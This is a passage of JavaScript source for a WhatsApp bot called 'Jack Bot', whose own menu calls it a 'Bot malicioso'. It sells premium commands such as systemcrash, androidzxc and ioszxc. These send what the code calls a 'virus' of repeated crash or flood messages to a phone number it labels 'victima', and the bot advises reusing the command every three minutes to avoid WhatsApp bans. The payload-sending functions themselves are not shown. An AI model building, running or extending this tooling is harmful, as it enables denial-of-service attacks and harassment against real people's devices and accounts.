        sendMixedMessages(whatsappNumber, encodedAmount);
        await sleep(2500); // Adjusted sleep time for clarity
        sendMessageWithMentions(
          "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\nUtiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.",
          [whatsappNumber]
        );
      }
        break;
        
      /*case "androidbattery": {
        if (!isPremium) return sendMessageWithMentions(mess.prem)
        if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
        let number = text.split(',')[0];
        let amount = text.split(',')[1] * 5;
        if (!number || !amount) {
          return sendMessageWithMentions(`Estas usando el comando mal...\n\n*Ejemplos:*\n${prefix + command} + número + , + 5\n${prefix + command} 51999999999,5`)
        }
        if (isNaN(parseInt(amount))) {
          return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
        }
        let cleanedNumber = number.replace(/[^0-9]/g, '');
        let encodedAmount = '' + encodeURI(amount);
        var contactInfo = await JackBot.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
        let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
        if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
          // No hacer nada, salir de la función
          return;
        }
        if (contactInfo.length == 0) {
          return sendMessageWithMentions("El número no está registrado en WhatsApp");
        }
        sendMessageWithMentions("virus en process..");
        await sleep(2000); // Adjusted sleep time for clarity
        sendRepeatedMessages2(whatsappNumber, encodedAmount);
        await sleep(2500); // Adjusted sleep time for clarity
        sendMessageWithMentions(
          "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\n*Utiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.*",
          [whatsappNumber]
        );
      }
        break;*/

      case 'pin': case 'pintesert': {
        if (!text) return sendMessageWithMentions(`Ingresa nombre de la imagen\n\nEjemplo:\n\n${prefix + command} Gatito`)
        let { pinterest } = require('./lib/scraper')
        anu = await pinterest(text)
        result = anu[Math.floor(Math.random() * anu.length)]
        JackBot.sendMessage(from, { image: { url: result }, caption: 'Generada con éxito' }, { quoted: m })
      }
        break


      case 'clearall': {
        if (!isCreator) return sendMessageWithMentions(mess.owner)
        JackBot.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
      }
        break

      case 'menu':
        let jackmenuoh = `Hola ${pushname}
*⚝* _¡Welcome! Aquí están los comandos de mi proyecto, Espero sea de tu agrado :)_
${readmore}

╰┈➤ *ᴄᴏᴍᴀɴᴅᴏꜱ ᴘʀᴇᴍɪᴜᴍꜱ*
> ${prefix}androidzxc
> ${prefix}systemcrash
> ${prefix}ioszxc

╰┈➤ *ᴄᴏᴍᴀɴᴅᴏꜱ ɢʀᴀᴛɪꜱ*
> ${prefix}s
> ${prefix}pin
> ${prefix}toimg

╰┈➤ *ɪɴꜰᴏ ᴄᴏᴍᴀɴᴅᴏꜱ ᴘʀᴇᴍɪᴜᴍ*
> ${prefix}premium

╰┈➤ *ᴄᴏɴᴛᴀᴄᴛᴀʀ ᴄᴏɴ ᴇʟ ᴄʀᴇᴀᴅᴏʀ*
> ${prefix}owner

╰┈➤ *Jack Bot*
           *Bot malicioso*`
        if (typemenu === 'v1') {
          JackBot.sendMessage(m.chat, {
            text: jackmenuoh,
            contextInfo: {
              externalAdReply: {
                title: botname,
                body: ownername,
                thumbnailUrl: 'https://i.ibb.co/S3Qx8Wj/20240703-083532.jpg',
                sourceUrl: link,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          }, {
            quoted: m
          })
        } else if (typemenu === 'v2') {
          JackBot.sendMessage(m.chat, {
            video: fs.readFileSync('./Media/thumb2.mp4'),
            gifPlayback: false,
            caption: jackmenuoh,
            contextInfo: {
              externalAdReply: {
                title: botname,
                body: ownername,
                thumbnailUrl: 'https://i.ibb.co/S3Qx8Wj/20240703-083532.jpg',
                sourceUrl: ``,
                mediaType: 1,
                renderLargerThumbnail: false
              }
            }
          }, {
            quoted: m
          })
        } else if (typemenu === 'v3') {
          JackBot.sendMessage(m.chat, {
            video: fs.readFileSync('./Media/thumb2.mp4'),
            caption: jackmenuoh,
            gifPlayback: false
          }, {
            quoted: m
          })
        } else if (typemenu === 'v4') {
          JackBot.relayMessage(m.chat, {
            scheduledCallCreationMessage: {
              callType: "AUDIO",
              scheduledTimestampMs: 1200,
              title: jackmenuoh
            }
          }, {})
        }
        break

      default:
        if (budy.startsWith('=>')) {
          if (!isCreator) return sendMessageWithMentions(mess.owner)

          function Return(sul) {
            sat = JSON.stringify(sul, null, 2)
            bang = util.format(sat)
            if (sat == undefined) {
              bang = util.format(sul)
            }
            return sendMessageWithMentions(bang)
          }
          try {
            sendMessageWithMentions(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
          } catch (e) {
            sendMessageWithMentions(String(e))
          }
        }
    }
  } catch (err) {
    JackBot.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
    console.log(util.format(err))
  }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright(`Update ${__filename}`))
  delete require.cache[file]
  require(file)
})

process.on('uncaughtException', function (err) {
  let e = String(err)
  if (e.includes("conflict")) return
  if (e.includes("Socket connection timeout")) return
  if (e.includes("not-authorized")) return
  if (e.includes("already-exists")) return
  if (e.includes("rate-overlimit")) return
  if (e.includes("Connection Closed")) return
  if (e.includes("Timed Out")) return
  if (e.includes("Value not found")) return
  console.log('Caught exception: ', err)
})
